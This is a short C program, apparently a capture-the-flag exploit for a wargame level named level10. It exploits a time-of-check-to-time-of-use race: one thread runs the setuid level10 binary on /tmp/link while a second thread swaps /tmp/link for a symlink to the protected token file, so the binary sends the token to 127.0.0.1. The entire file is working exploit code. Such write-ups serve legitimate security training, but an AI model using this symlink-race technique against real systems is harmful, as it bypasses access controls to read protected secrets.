#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>

void *main_routine(void *arg)
{
    system("/home/user/level10/level10 /tmp/link 127.0.0.1");
}

void *bro_routine(void *arg)
{
    unlink("/tmp/link");
    symlink("/home/user/level10/token", "/tmp/link");
}

int main()
{
    unlink("/tmp/link");
    system("touch /tmp/link");
    system("ls -l /tmp/link");

    pthread_t m;
    pthread_t b;

    pthread_create(&m, NULL, &main_routine, NULL);
    usleep(1);
    pthread_create(&b, NULL, &bro_routine, NULL);

    pthread_join(b, NULL);
    pthread_join(m, NULL);

    system("ls -l /tmp/link");
    return (0);
}